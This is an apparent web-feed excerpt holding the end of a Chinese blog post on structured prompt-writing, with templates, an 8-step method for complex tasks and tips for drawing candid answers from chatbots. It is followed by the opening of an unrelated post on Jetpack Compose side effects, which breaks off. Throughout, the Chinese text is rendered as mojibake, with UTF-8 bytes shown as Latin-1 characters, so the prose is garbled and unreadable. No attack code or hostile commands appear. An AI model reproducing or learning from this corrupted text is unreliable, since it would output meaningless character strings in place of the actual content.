<p>ç¬¬ä¸€æ­¥:åˆ¤æ–­ä»»åŠ¡çº§åˆ«</p>
<pre><code class="hljs language-text" lang="text">ä½ æ„¿æ„ä¸ºè¿™ä¸ªä»»åŠ¡èŠ±å¤šå°‘æ—¶é—´ï¼Ÿ
â”œâ”€ &lt; 5åˆ†é’Ÿ â†’ ç”¨"æœ€å°å…¬å¼"(90%çš„æ—¥å¸¸ä»»åŠ¡)
â”œâ”€ 2å°æ—¶å·¦å³ â†’ ä¸Š"8æ­¥æ³•"(éœ€æ±‚åˆ†æã€é•¿æ–‡ç¿»è¯‘)
â””â”€ éœ€è¦åå¤ä½¿ç”¨ â†’ èµ°"æ¨¡æ¿æ²‰æ·€"(æŠ½è±¡æˆå¯å¤ç”¨èµ„äº§)
</code></pre>
<p>ç¬¬äºŒæ­¥:é€‰æ‹©æ¨¡å‹ç­–ç•¥</p>
<pre><code class="hljs language-text" lang="text">ä»»åŠ¡ç‰¹å¾?
â”œâ”€ å¤§é‡çç¢é‡å¤ â†’ å…è´¹æ¨¡å‹è·‘é‡
â”œâ”€ é«˜è´¨é‡å•æ¬¡äº§å‡º â†’ è´µæ¨¡å‹ç²¾å‡†æ‰“å‡»  
â””â”€ åˆ›æ„/ç­–ç•¥ç±» â†’ å¤šæ¨¡å‹å¹¶è¡Œ,æ‹©ä¼˜é‡‡æ ·
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/49f9c81353f64632af10ce3d937d3515~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531490&amp;x-signature=k9g10bbJe73nmtZpak7J92xxQpk%3D" alt="Taming_AI_Through_Structure-å›¾ç‰‡-2.jpg" loading="lazy"/></p>
<h2 data-id="heading-1">æ—¥å¸¸ä»»åŠ¡çš„æœ€å°å…¬å¼</h2>
<p>æ€è€ƒå…¬å¼ [Personaï¼šè§’è‰²] + [Goalï¼šç›®æ ‡] + [Taskï¼šä»»åŠ¡] + [Contextï¼šèƒŒæ™¯]</p>
<p>åˆ©ç”¨å…¬å¼çš„è¿‡ç¨‹ä¹Ÿæ˜¯å®Œå–„è‡ªå·±éœ€æ±‚çš„è¿‡ç¨‹ã€‚</p>
<p>æ ¸å¿ƒç»“æ„ï¼š</p>
<pre><code class="hljs language-text" lang="text">## è§’è‰²
ä½œä¸º [é¢†åŸŸä¸“å®¶]

## èƒŒæ™¯  
å¿…é¡»é¿å… [ç¦å¿Œé¡¹],ä¼˜å…ˆè€ƒè™‘ [å…³é”®è¦ç´ ]

## ä»»åŠ¡  
å®ç° [å…·ä½“ç›®æ ‡],è¦æ±‚ [é‡åŒ–æ ‡å‡†],æœ€ç»ˆè¾“å‡ºæœåŠ¡äº [ç›®æ ‡ç”¨æˆ·]

## é™åˆ¶  
[æœ€å¤š3æ¡,é‡åŒ–ä¼˜å…ˆ,å¦‚"100å­—å†…""3ä¸ªè¦ç‚¹"]

## è¾“å‡º  
1. ä»¥ Markdown å½¢å¼è¾“å‡º
2. è¾“å‡ºç»“æœå¿…é¡»åŒ…å« [å‚è€ƒèµ„æ–™]
3. è¾“å‡ºé£æ ¼ [çŠ€åˆ©ã€å‡ç»ƒã€æœ‰åŠ›]
4. å±•ç¤ºè‡³å°‘ä¸¤ç§å¤‡é€‰æ–¹æ¡ˆåŠå…¶æ·˜æ±°ç†ç”±

## å¤‡æ³¨
- è¿™å¯¹æˆ‘çš„èŒä¸šç”Ÿæ¶¯éå¸¸é‡è¦!
</code></pre>
<p>å®æˆ˜æ¡ˆä¾‹:ç»™æ–°å®¢æˆ·å†™äº§å“ä»‹ç»é‚®ä»¶</p>
<pre><code class="hljs language-text" lang="text">## è§’è‰²
ä½œä¸º SaaS é”€å”®ä¸“å®¶

## èƒŒæ™¯
å¯¹æ–¹æ˜¯ä¸­å‹ä¼ä¸š CTO,æ¯å¤©æ”¶ 200+ é‚®ä»¶,è®¨åŒè¥é”€è¯æœ¯

## ä»»åŠ¡
ç”¨ 150 å­—å†…è¯´æ¸…æ¥šæˆ‘ä»¬çš„ API ç›‘æ§å·¥å…·èƒ½è§£å†³ä»–ä»€ä¹ˆç—›ç‚¹,æœ€ç»ˆè®©ä»–æ„¿æ„ç‚¹å‡» Demo é“¾æ¥

## é™åˆ¶
- ä¸å‡ºç°"è¡Œä¸šé¢†å…ˆ""èµ‹èƒ½"ç­‰åºŸè¯
- å¿…é¡»æœ‰ 1 ä¸ªå…·ä½“æ•°æ®æ”¯æ’‘
- å¼€å¤´ç¬¬ä¸€å¥å¿…é¡»æ˜¯é—®é¢˜è€Œéè‡ªæˆ‘ä»‹ç»

## è¾“å‡º
ç»™å‡º 2 ä¸ªç‰ˆæœ¬:ä¸€ä¸ªå¼ºè°ƒ"çœé’±",ä¸€ä¸ªå¼ºè°ƒ"é¿å…æ•…éšœ"
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7d8aa9a03bbc45c59ac962cdfe203bc8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531490&amp;x-signature=ANYLcXniBaWMKCo3Op4jYJUFQy8%3D" alt="Taming_AI_Through_Structure-å›¾ç‰‡-3.jpg" loading="lazy"/></p>
<h2 data-id="heading-2">å¤æ‚ä»»åŠ¡çš„ 8 æ­¥æ³•</h2>
<p>æˆ‘ä¸ªäººæ„Ÿè§‰çš„å¤æ‚ä»»åŠ¡ï¼Œæ˜¯å€¼å¾—æˆ‘è‡ªå·±èŠ±2hå»å¤„ç†çš„ä»»åŠ¡ã€‚ä¾‹å¦‚éœ€æ±‚åˆ†æã€ç¿»è¯‘æ–‡ç« ã€‚</p>
<p>æˆ‘ä¼šæŒ‰ç…§ä»¥ä¸‹æµç¨‹è¿›è¡Œå¤„ç†ï¼š</p>
<ol>
<li>æ˜ç¡®é—®é¢˜ä¸ä¸Šä¸‹æ–‡</li>
<li>è®© AI è‡ªé€‰å¿…è¦è§’è‰²</li>
<li>è®© AI è¿ç»­æé—®ï¼Œç›´åˆ° 95% ç†è§£
<ol>
<li>ä¸çŸ¥é“å¦‚ä½•ç•Œå®šæ˜¯å“ªä¸ªé¢†åŸŸçš„é—®é¢˜ï¼Œè®© AI è‡ªé€‰è§’è‰²ï¼Œâ€œä½ ä»¬è®¤ä¸ºè§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæœ€éœ€è¦å“ªä¸‰ç±»ä¸“å®¶è§’è‰²ï¼Ÿæˆ‘ä»¬å…ˆæŒ‰è¿™ä¸ªè§’è‰²åˆ†å·¥æ¥è„‘æš´ã€‚â€</li>
<li>ä¸çŸ¥é“è‡ªå·±æ˜¯å¦æ¸…æ¥šè‡ªå·±æ˜¯å¦å·²ç»å®Œå…¨ææ‡‚é—®é¢˜ï¼Œå¢åŠ ä¸€æ­¥ï¼š"åœ¨è¡ŒåŠ¨å‰ï¼Œè¯·å‘æˆ‘è¿ç»­æé—®ï¼Œç›´åˆ°ä½  95%ç¡®ä¿¡ç†è§£æˆ‘çš„ç›®æ ‡å’Œè¾¹ç•Œã€‚"</li>
</ol>
</li>
<li>å…ˆè·‘ä¸€ä¸ªå…·ä½“æƒ…å¢ƒã€‚</li>
<li>æ ¹æ®è¡¨ç°è¿­ä»£</li>
<li>è®©â€œçº¢é˜Ÿâ€æŒ‘åˆºã€‚æˆç«‹ä¸€ä¸ªå°ç»„ï¼Œå”¯ä¸€ä»»åŠ¡å°±æ˜¯æŒ‘è¿™ä¸ªæ–¹æ¡ˆçš„æ¯›ç—…ã€‚â€œå‡è®¾è¿™ä¸ª[é¡¹ç›®]å½»åº•å¤±è´¥ï¼Œç°åœ¨å¤ç›˜ï¼Œæœ€å¯èƒ½çš„åŸå› æ˜¯ä»€ä¹ˆï¼Ÿâ€</li>
<li>ç›´åˆ°æŠ½åˆ° SSRï¼Œå°±åŸºäºé‚£ä¸ªå›ç­”å¼€å§‹å¾®è°ƒæç¤ºè¯ï¼Œç›´åˆ°å¯ä»¥ç¨³å®šçš„ç”Ÿæˆç»“æœã€‚</li>
<li>æŠ½è±¡æˆå¯æ‰©å±•çš„æç¤ºæ¨¡æ¿ï¼Œä¾‹å¦‚åŸºç¡€å…¬å¼ï¼šè§’è‰² + èƒŒæ™¯ + ä»»åŠ¡ + è§„åˆ™ + è¦æ±‚ + æ ¼å¼ + èŒƒä¾‹ + ç¦å¿Œ</li>
</ol>
<pre><code class="hljs language-text" lang="text">### è§’è‰²
ä½œä¸º [xxxxx] ä¸“å®¶

### èƒŒæ™¯
å½“å‰é¢ä¸´ [xxxxx] é—®é¢˜  
äº¤ä»£èƒŒæ™¯ä¸å—ä¼—:æ˜ç¡® AI åº”æ‰®æ¼”çš„è§’è‰²ã€ä»»åŠ¡å‘ç”Ÿçš„åœºæ™¯ä»¥åŠç›®æ ‡ç¾¤ä½“

### ä»»åŠ¡ 
ç¬¬ä¸€è½®:åˆ—å‡ºæœ¬å‘¨å®Œæˆçš„ 5 é¡¹é‡ç‚¹å·¥ä½œ  
ç¬¬äºŒè½®:é’ˆå¯¹ç¬¬ä¸‰é¡¹æŠ€æœ¯æ”»å…³,è¯¦ç»†è¯´æ˜é‡åˆ°çš„ 3 ä¸ªéš¾ç‚¹  
ç¬¬ä¸‰è½®:å°†ä¸Šè¿°éš¾ç‚¹è½¬åŒ–ä¸ºå¯è§†åŒ–çš„ç”˜ç‰¹å›¾

### è¦æ±‚
[å…·ä½“è¦æ±‚]

### æ ¼å¼
1. è¯·ä½¿ç”¨ Markdown æ ¼å¼è¾“å‡º  
2. é¦–å…ˆç»™å‡ºä¸€ä¸ª 1-10 åˆ†çš„æ€»ä½“è¯„åˆ†å’Œä¸€å¥è¯æ€»ç»“  
3. ç„¶ååˆ†'ä¼˜åŠ¿'ã€'åŠ£åŠ¿'å’Œ'è‡´å‘½é£é™©'ä¸‰ä¸ªæ¿å—è¿›è¡Œè¯¦ç»†è®ºè¿°

### èŒƒä¾‹
ä¾‹å¦‚,ä½ å¯ä»¥åƒè¿™æ ·æå‡ºè´¨ç–‘:'ä½ çš„è·å®¢æˆæœ¬æ¨¡å‹æ˜¯æ€æ ·çš„?å¦‚ä½•ä¸ç°æœ‰çš„æˆç†Ÿç¤¾äº¤åº”ç”¨ç«äº‰?'
</code></pre>
<p>å¤ç›˜æ£€æŸ¥æ¸…å•ï¼š</p>
<ol>
<li>é¢„æœŸè¾¾åˆ°çš„æ•ˆæœï¼Ÿ</li>
<li>å¦‚ä½•è¯„ä»·ï¼ˆéªŒè¯ï¼‰è¿™æ¬¡ç”Ÿæˆçš„ç»“æœï¼Ÿ</li>
<li>æ˜¯å¦æœ‰æ˜æ˜¾é”™è¯¯ç­”æ¡ˆï¼Ÿä½ æ€ä¹ˆå¤„ç†çš„ï¼Ÿ</li>
<li>ç”Ÿæˆçš„å†…å®¹å’Œä½ çš„é¢„æœŸä¸ç¬¦ï¼Œæˆ‘æ˜¯å¦‚ä½•è°ƒæ•´ä¼˜åŒ–çš„ï¼Ÿ</li>
<li>æˆ‘ä¸ºä»€ä¹ˆè¿™ä¹ˆå†™æç¤ºè¯ï¼Ÿ</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a9e399cdadb433f8cd797a36952c0fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531490&amp;x-signature=k8LiTkCbFEJrs0uaVtH7FZHucBE%3D" alt="Taming_AI_Through_Structure-å›¾ç‰‡-4.jpg" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a56c23a1b3bb4525a783eea0cacc7c96~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531490&amp;x-signature=wXCDg0mnf0babOnJgGKatvRlG2Q%3D" alt="Taming_AI_Through_Structure-å›¾ç‰‡-5.jpg" loading="lazy"/></p>
<h2 data-id="heading-3">æå‡è¾“å‡ºè´¨é‡çš„æ ¸å¿ƒæŠ€å·§</h2>
<h3 data-id="heading-4">ç”Ÿæˆå€™é€‰ç­”æ¡ˆ</h3>
<p>é€‚ç”¨åœºæ™¯:
åˆ›æ„å†™ä½œã€ç­–ç•¥å»ºè®®ã€æšä¸¾ç±»é—®ç­”(æœ‰å¤šä¸ªåˆç†ç­”æ¡ˆçš„åœºæ™¯)
ä¸é€‚ç”¨:
æ ‡å‡†ç®—å¼ã€äº‹å®æ€§é—®ç­”(åªæœ‰ä¸€ä¸ªæ­£ç¡®ç­”æ¡ˆ)</p>
<pre><code class="hljs language-text" lang="text">ä½ æ˜¯ä¸€ä¸ªå¤šæ ·åŒ–ç”Ÿæˆçš„åŠ©æ‰‹ã€‚è¯·æŒ‰ç…§å¦‚ä¸‹è¦æ±‚è¾“å‡ºï¼š
1. ç”Ÿæˆ 5 ä¸ªä¸åŒçš„å€™é€‰ç­”æ¡ˆï¼ˆå†…å®¹å°½é‡æœ‰é£æ ¼å·®å¼‚ï¼‰ã€‚
2. ä¸ºæ¯ä¸ªç­”æ¡ˆç»™å‡º 0-1 æ¦‚ç‡ï¼Œå¹¶ä¿è¯æ€»å’Œä¸º 1ã€‚// å¿…è¦æ—¶æç¤ºâ€œæ¦‚ç‡å¿…é¡»éè´Ÿâ€ã€‚
3. æŒ‰æ¦‚ç‡ä»é«˜åˆ°ä½æ’åºï¼Œé€æ¡è¾“å‡ºä¸ºï¼šå†…å®¹ï½œæ¦‚ç‡ã€‚
4. åœ¨æœ«å°¾ç»™å‡ºâ€œé‡‡æ ·å»ºè®®â€ï¼š
   - è‹¥åªéœ€ 1 ä¸ªç­”æ¡ˆï¼Œæ¨èé€‰æ‹©æ¦‚ç‡æœ€é«˜è€…ï¼›
   - è‹¥éœ€å¤šæ ·æ€§ï¼Œå¯æŒ‰æ¦‚ç‡åŠ æƒè¿›è¡Œéšæœºé‡‡æ ·ã€‚
</code></pre>
<h3 data-id="heading-5">Mom Test:è®© AI è¯´çœŸè¯è€Œéå¥½å¬è¯</h3>
<p>ç†è®ºä¾æ®: äººä»¬å‡ºäºç¤¼è²Œä¼šè¯´"å¥½è¯"è€Œé"çœŸè¯"ã€‚AI ä¹Ÿä¼šã€‚</p>
<ol>
<li>é¿å…é—®æ„è§ï¼Œæ”¹é—®è¯æ®ã€‚
<ul>
<li>é”™è¯¯ç¤ºèŒƒï¼šä½ è§‰å¾—è¿™ä¸ªæ–¹æ¡ˆå¥½ä¸å¥½ï¼Ÿè¿™æ ·è®¾è®¡æ˜¯ä¸æ˜¯å¾ˆåˆç†ï¼Ÿ</li>
<li>åˆ†æï¼šæ¨¡å‹ä¼šå€¾å‘äºè¯´æ›´å¤šæ³›æ³›çš„æ­ç»´è¯ã€‚</li>
<li>æ­£ç¡®ç¤ºèŒƒï¼šè¯·ç»™æˆ‘ 3 ä¸ªå…·ä½“åä¾‹ï¼Œè¯´æ˜è¿™ä¸ªæ–¹æ¡ˆå¯èƒ½å¤±è´¥çš„åœºæ™¯ã€‚è¯·åŸºäºå·²çŸ¥çš„äº‹å®/æ•°æ®ï¼Œåˆ—å‡ºè¿™ä¸ªè®¾è®¡å¯èƒ½é‡åˆ°çš„é™åˆ¶</li>
</ul>
</li>
<li>é¿å…æœªæ¥å‡è®¾ï¼Œè¿½é—®è¿‡å»è¡¨ç°ã€‚
<ul>
<li>é”™è¯¯ç¤ºèŒƒï¼šå¦‚æœé‡åˆ° X é—®é¢˜ï¼Œä½ ä¼šæ€ä¹ˆå¤„ç†ï¼Ÿ</li>
<li>åˆ†æï¼šæ¨¡å‹è¾“å‡ºæ²¡æœ‰ä¾æ®ï¼Œå¯èƒ½ä¼šäº§ç”Ÿå¹»è§‰ã€‚</li>
<li>æ­£ç¡®ç¤ºä¾‹ï¼šè¯·åˆ—ä¸¾ä½ åœ¨è®­ç»ƒè¯­æ–™ä¸­å­¦åˆ°çš„ã€å·²ç»å‡ºç°è¿‡çš„ X é—®é¢˜è§£å†³æ¡ˆä¾‹ã€‚åœ¨è¿‡å»çš„ç ”ç©¶æˆ–å†å²è®°å½•ä¸­ï¼ŒX æ˜¯å¦‚ä½•è¢«è§£å†³çš„ï¼Ÿ</li>
</ul>
</li>
<li>ç”¨è¡Œä¸ºé©±åŠ¨è€Œä¸æ˜¯æ€åº¦é©±åŠ¨
<ul>
<li>é”™è¯¯ç¤ºèŒƒï¼šå¦‚æœä½ æ˜¯ç”¨æˆ·ï¼Œä½ ä¼šä¸ä¼šå–œæ¬¢è¿™ä¸ªäº§å“ï¼Ÿ</li>
<li>æ­£ç¡®ç¤ºèŒƒï¼šå‡è®¾ä½ æ˜¯ç›®æ ‡ç”¨æˆ·ï¼Œè¯·æ¨¡æ‹Ÿä¸€æ¬¡å®é™…ä½¿ç”¨è¿‡ç¨‹ï¼Œå¹¶é€æ­¥å†™å‡ºä½ ä¼šç‚¹å‡»ã€è¾“å…¥ã€çŠ¹è±«çš„æ­¥éª¤</li>
</ul>
</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c298f22846f4c5285208e294982cbd3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531490&amp;x-signature=3zi1VZ%2BjUnHq3SWPY8qNzspi6c4%3D" alt="Taming_AI_Through_Structure-å›¾ç‰‡-6.jpg" loading="lazy"/></p>
<h2 data-id="heading-6">å·¥å…·</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fpromptpilot.volcengine.com%2Ftasklist" target="_blank" title="https://promptpilot.volcengine.com/tasklist" ref="nofollow noopener noreferrer">Prompt Pilot</a> ç”¨äºé’ˆå¯¹å›½å†…æ¨¡å‹è¿›è¡Œ Prompt å·¥ç¨‹è°ƒä¼˜</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTanShilongMario%2FPromptFill" target="_blank" title="https://github.com/TanShilongMario/PromptFill" ref="nofollow noopener noreferrer">PromptFill</a> ä¸“ä¸º AI ç»˜ç”»è®¾è®¡çš„ç»“æ„åŒ–æç¤ºè¯ç”Ÿæˆå·¥å…·ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flinshenkx%2Fprompt-optimizer" target="_blank" title="https://github.com/linshenkx/prompt-optimizer" ref="nofollow noopener noreferrer">prompt-optimizer</a> æç¤ºè¯ä¼˜åŒ–å™¨ï¼ŒåŠ©åŠ›äºç¼–å†™é«˜è´¨é‡çš„æç¤ºè¯</li>
</ul>
<h2 data-id="heading-7">æ€»ç»“</h2>
<ol>
<li>AI ä¸æ˜¯é­”æ³•,æ˜¯é•œå­ã€‚å®ƒè¿”å›çš„æ··ä¹±ç¨‹åº¦,ç›´æ¥åæ˜ ä½ è¾“å…¥çš„æ··ä¹±ç¨‹åº¦ã€‚</li>
<li>ç»“æ„åŒ– = å¯å¤ç”¨ = å¯æ‰©å±• = å¯éªŒè¯ã€‚å†™æç¤ºè¯å°±åƒå†™ç¨‹åº:æ˜ç¡®æ¥å£ã€æ— æ­§ä¹‰ã€å¯é‡å¤ã€‚</li>
<li>æœ€å°åŒ–ç†µ,æœ€å¤§åŒ–ä»·å€¼ã€‚æˆ‘ä»¬çš„æ¯ä¸€ä¸ªå­—éƒ½åœ¨é™ä½ç³»ç»Ÿçš„ä¸ç¡®å®šæ€§ã€‚åºŸè¯æ˜¯ç†µ,çº¦æŸæ˜¯ç§©åº,èŒƒä¾‹æ˜¯é”šç‚¹ã€‚</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e6b51ed072b745939186b52c4503c69f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2FuZUxvZ2dlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768531490&amp;x-signature=op9Ah0JxVg8kwaJAdY9AvWnPlmE%3D" alt="Taming_AI_Through_Structure-å›¾ç‰‡-8.jpg" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[compose ä¸­çš„é™„å¸¦æ•ˆåº”ç¬”è®°ä¸€]]></title>    <link>https://juejin.cn/post/7592882393250955307</link>    <guid>https://juejin.cn/post/7592882393250955307</guid>    <pubDate>2026-01-09T02:39:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592882393250955307" data-draft-id="7592823500416253978" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="compose ä¸­çš„é™„å¸¦æ•ˆåº”ç¬”è®°ä¸€"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-09T02:39:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¿ƒæºxinyuan"/> <meta itemprop="url" content="https://juejin.cn/user/4283353029151694"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            compose ä¸­çš„é™„å¸¦æ•ˆåº”ç¬”è®°ä¸€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4283353029151694/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¿ƒæºxinyuan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T02:39:59.000Z" title="Fri Jan 09 2026 02:39:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>é€šå¸¸æƒ…å†µä¸‹çŠ¶æ€å‘ç”Ÿæ”¹å˜æ—¶æƒ³è¦æ›´æ–°UIï¼Œæˆ‘ä»¬ä¼šä½¿ç”¨ var value by remeber { mutableStateOf() }æ¥åˆ›å»ºä¸€ä¸ªå¯è§‚å¯Ÿçš„çŠ¶æ€æ•°æ®ã€‚å½“stateçš„æ•°æ®å‘ç”Ÿæ”¹å˜ä»¥åï¼Œä½¿ç”¨äº†stateæ•°æ®ç»„ä»¶ä¼šå‘ç”Ÿé‡ç»„ï¼Œä»è€Œå®ç°åˆ·æ–°ã€‚
ä½†æœ‰äº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æƒ³è¦å®ç°åœ¨å¯ç»„åˆå‡½æ•°ä¸­æ‰§è¡Œä¸€æ¬¡ç½‘ç»œè¯·æ±‚ï¼Œæ ¹æ®è¯·æ±‚ç»“æœæ”¹å˜ç•Œé¢çŠ¶æ€ï¼Œæˆ–è€…æ‰§è¡ŒæŒ‚èµ·å‡½æ•°å†æ”¹å˜ç•Œé¢çŠ¶æ€ã€‚æ­¤æ—¶éœ€è¦ç”¨åˆ°é™„å¸¦æ•ˆåº”ã€‚</p>
<p>1.LaunchedEffect</p>
<p>launchedEffectä¸»è¦ä½œç”¨æ˜¯è®©ä½ åœ¨Composableä½œç”¨åŸŸé‡Œå®ç°åç¨‹å·¥ä½œï¼Œæ¥å®Œæˆå¼‚æ­¥ã€è€—æ—¶æ“ä½œã€ç½‘ç»œè¯·æ±‚ç­‰</p>
